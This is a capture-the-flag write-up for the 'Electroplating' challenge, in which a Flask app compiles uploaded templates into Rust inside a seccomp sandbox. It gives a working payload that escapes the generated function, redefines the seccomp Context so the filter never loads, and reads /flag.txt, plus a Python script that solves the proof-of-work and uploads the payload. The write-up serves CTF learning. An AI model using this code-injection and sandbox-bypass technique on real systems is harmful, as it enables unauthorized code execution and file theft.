Title: Electroplating
Date: 2021-08-09

We are given a docker container that presents us a gunicorn web-app. Just as in the Fancy Button Generator challenge we are asked to verify our session using the api-endpoint at location /pow. By looking at the app.py we can see that this time the difficulty was increased to 6:

    :::python
    @app.route("/pow", methods=["GET", "POST"])
    def do_pow():
        if request.method == 'GET':
            ...
        else:
            import pow
            difficulty = int(os.getenv("DIFFICULTY", "6"))
            pref, suff = session['pref'], session['suff']
            answer = request.json.get('answer')
            if pow.verify(pref, suff, answer, difficulty):
                session['verified'] = True
                session['end'] = time.time() + 30
                return "Thank you!"
            else:
                return "POW incorrect"

For experimenting with the docker container it is a good idea to lower the difficulty when testing locally. By further looking at the source code of the Docker image we find a skeleton directory for a web application written in rust as well as an flask based python web application. In the app.py we find out about what the / endpoint does

    :::python
    @app.route('/', methods=['GET', 'POST'])
    def upload_file():
        if not session.get('verified'):
            return "Please complete <pre>/pow</pre>", 403
    
        os.chdir('/app')
        if request.method == 'POST':
            try:
                file = request.files['file']
                path = os.path.join('uploads', secure_filename(file.filename))
                file.save(path)
                response = get_result(path)
                os.remove(path)
            except:
                response = traceback.format_exc()
            del session['verified']
            return render_template('upload.html', response=response)
        else:
            return render_template('upload.html')
    
After the session was verified we are presented with a file upload widget in the browser. The challenge also provides an example file template.htmlrs which will be accepted by the uploader:

    :::html
    <html>
    <title><templ>"Page Title".to_string()</templ></title>
    <h1><templ>"bruh".to_string()</templ></h1>
    </html>

The template file seems to contain rust code inside of each &lt;templ&gt; tag. But how does the python app manage to interprete these expressions correctly? The magic happens within the get_result() function found in the app.py. We find two variables containing a code template for a web-application written in rust and the other containing a code template for a rust methods. 

    :::python
    rust_template = """
    #![allow(warnings, unused)]
    use std::collections::HashMap;
    use std::fs;
    use std::env;
    extern crate seccomp;
    extern crate libc;
    
    extern crate tiny_http;
    extern crate seccomp_sys;
    use seccomp::*;
    
    use tiny_http::{Server, Response, Header, Request};
    
    static ALLOWED: &'static [usize] = &[0, 1, 3, 11, 44,
                                         60, 89, 131, 202,
                                         231, 318];
    
    fn main() {
        let mut dir = env::current_exe().unwrap();
        dir.pop();
        dir.push("../../app.htmlrs");
        let template = fs::read_to_string(dir.to_str().unwrap()).unwrap();
        let server = Server::http("127.0.0.1:%s").unwrap();
        apply_seccomp();
        for request in server.incoming_requests() {
            println!("received request! method: {:?}, url: {:?}",
                request.method(),
                request.url(),
            );
            handle_request(request, &template);
            std::process::exit(0);
        }
    }
    
    fn handle_request(req: Request, template: &String) {
        let mut methods: HashMap<_, fn() -> String> = HashMap::new();
        %s
        let mut html = template.clone();
        for (name, fun) in methods.iter() {
            html = html.replace(name, &fun());
        }
        let header = Header::from_bytes(
            &b"Content-Type"[..], &b"text/html"[..]
        ).unwrap();
        let mut response = Response::from_string(html);
        response.add_header(header);
        req.respond(response).unwrap();
    }
    
    fn apply_seccomp() {
        let mut ctx = Context::default(Action::KillProcess).unwrap();
        for i in ALLOWED {
            let rule = Rule::new(*i, None, Action::Allow);
            ctx.add_rule(rule).unwrap();
        }
        ctx.load();
    }
    %s
    """
    
    templ_fun = """
    fn temp%s() -> String {
        %s
    }
    """

The get_result() function creates a copy of the skeleton directory containing the rust web-application. It uses the function template variable to create a rust method for each &lt;templ&gt; tag found in the uploaded file and puts the contents of each tags into the function body. The new rust methods are then injected into the rust code template found in the rust_template variable. The final result is written into an appp.htmlrs file inside of the copied skeleton directory before it gets executed in a separate process. After that the python part tries to reach the rust web-api endpoint to receive the rendered html contents.

    :::python
    def get_result(template_path: str):
    with open(template_path) as f:
        templ = f.read()

    with tempfile.TemporaryDirectory() as tmpdir:
        shutil.copytree('skeleton', tmpdir, dirs_exist_ok=True)
        os.chdir(tmpdir)
        port = str(random.randrange(40000, 50000))
        with open('src/main.rs', 'w') as f:
            soup = BeautifulSoup(templ, 'html.parser')
            funcs = []
            for i, temp in enumerate(soup.find_all('templ')):
                funcs.append(templ_fun % (i, temp.text))
                templ = templ.replace(f'<templ>{temp.text}</templ>', f'temp{i}', 1)
            hashmap = ""
            for i in range(len(funcs)):
                hashmap += f"""methods.insert("temp{i}", temp{i});\n"""
            f.write(rust_template % (port, hashmap, '\n'.join(funcs)))

        with open('app.htmlrs', 'w') as f:
            f.write(templ)

        os.system('cargo run --offline --verbose &')
        for _ in range(10):
            time.sleep(5)
            try:
                r = requests.get(f'http://localhost:{port}')
                os.chdir('/app')
                return r.text
            except:
                return traceback.format_exc()

        return "App failed to start"

The challenge here seems to be easy at first as we just need to place the correct rust code inside of one of the &lt;templ&gt; tags in the uploaded file to open and read the flag.txt file:

    html:::
    <html>
    <title><templ>fs::read_to_string("/flag.txt").unwrap()</templ></title>
    <h1><templ>"bruh".to_string()</templ></h1>
    </html>

However this attempt fails because the rust application uses the seccomp library to limit the system calls that are allowed to do:

    rust:::
    use seccomp::*;
    
    ...
    
    static ALLOWED: &'static [usize] = &[0, 1, 3, 11, 44,
                                         60, 89, 131, 202,
                                         231, 318];
    
    ...
    
    fn apply_seccomp() {
        let mut ctx = Context::default(Action::KillProcess).unwrap();
        for i in ALLOWED {
            let rule = Rule::new(*i, None, Action::Allow);
            ctx.add_rule(rule).unwrap();
        }
        ctx.load();
    }

By looking at the beginning of the rust_template variable we can see that the seccomp namespace is not imported but only its contents. This gives us the chance to create the same classes as provided by the lib.rs but with manipulated behaviour. By injecting our own manipulated "Context" class into the uploaded file we can prevent the rust application from applying the seccomp rules into the kernel:

    html:::
    <html>
    <title><templ>fs::read_to_string("/flag.txt").unwrap()</templ></title>
    <h1><templ>
      "anything".to_string()
      // / 1) escape from temp1() method definition by putting a } here
    }
    
    // / 2) seccomp reimplementation - copied from lib.rs and manipulated to allow everything
    // /    this works because the seccomp::Context object is imported with * and instanciated without
    // /    using its original namespace seccomp::
    
    // / <![CDATA[
    // /    Note: the CDATA section enables us to use "<" and ">" (prevents the html parser from recognizing tags in here)
    use seccomp_sys::scmp_compare::*;
    use seccomp_sys::*;
    
    #[derive(Debug)]
    pub struct SeccompError {
        msg: String,
    }
    
    impl SeccompError {
        fn new<T: Into<String>>(msg: T) -> Self {
            SeccompError { msg: msg.into() }
        }
    }
    
    #[derive(Debug)]
    pub struct Context {
        int: *mut scmp_filter_ctx,
    }
    
    impl Context {
        /// Creates new context with default action
        pub fn default(def_action: Action) -> Result<Context, SeccompError> {
            let filter_ctx = unsafe { seccomp_init(Action::Allow.into()) };
            if filter_ctx.is_null() {
                return Err(SeccompError::new("initialization failed"));
            }
            Ok(Context { int: filter_ctx })
        }
    
        /// Adds rule to the context
        pub fn add_rule(&mut self, rule: Rule) -> Result<(), SeccompError> {
            Ok(())
        }
    
        /// Loads the filter into the kernel. Rules will be applied when this function returns.
        pub fn load(&self) -> Result<(), SeccompError> {
            Ok(())
        }
    }
    // / ]]>
    
    // / 3) defining another method to have valid syntax - the } will be added by the app.py
    fn anyMethod() -> String {
      "hello".to_string()
    </templ></h1>
    </html>

Now all we need to do is upload this file and the flag will be presented to us as replacement for the first &lt;templ&gt; tag.

The Fancy Button Generator challenge already gave us the template-solve.py file which automates session verification and file uploading for us. A slight modification allows us to use it for both - local testing and solving the remote challenge:

    :::python
    import requests
    
    import hashlib
    import uuid
    import binascii
    import os
    import sys
    
    def generate():
        return uuid.uuid4().hex[:4], uuid.uuid4().hex[:4]
    
    def verify(prefix, suffix, answer, difficulty=6):
        hash = hashlib.sha256(prefix.encode() + answer.encode() + suffix.encode()).hexdigest()
        return hash.endswith("0"*difficulty)
    
    def solve(prefix, suffix, difficulty):
        while True:
            test = binascii.hexlify(os.urandom(4)).decode()
            if verify(prefix, suffix, test, difficulty):
                return test
    
    s = requests.Session()
    
    print("Hint: usage [url] [difficulty]")
    print("Example: " + sys.argv[0] + " [url] [difficulty]")
    
    host = None
    difficulty = None
    
    if len(sys.argv) > 1 and sys.argv[1]:
        host = sys.argv[1]
    if len(sys.argv) > 2 and sys.argv[2]:
        difficulty = int(sys.argv[2])
    
    if host is None or host == "":
        host = "https://electroplating.rars.win"
    if difficulty is None:
        difficulty = 6
    
    data = s.get(host + "/pow").json()
    print("Solving POW")
    solution = solve(data['pref'], data['suff'], difficulty)
    print(f"Solved: {solution}")
    s.post(host + "/pow", json={"answer": solution})
    
    files = { 'file': open('template.htmlrs', 'rb') }
    r = s.post(host + "/", files=files)
    print(r.text)

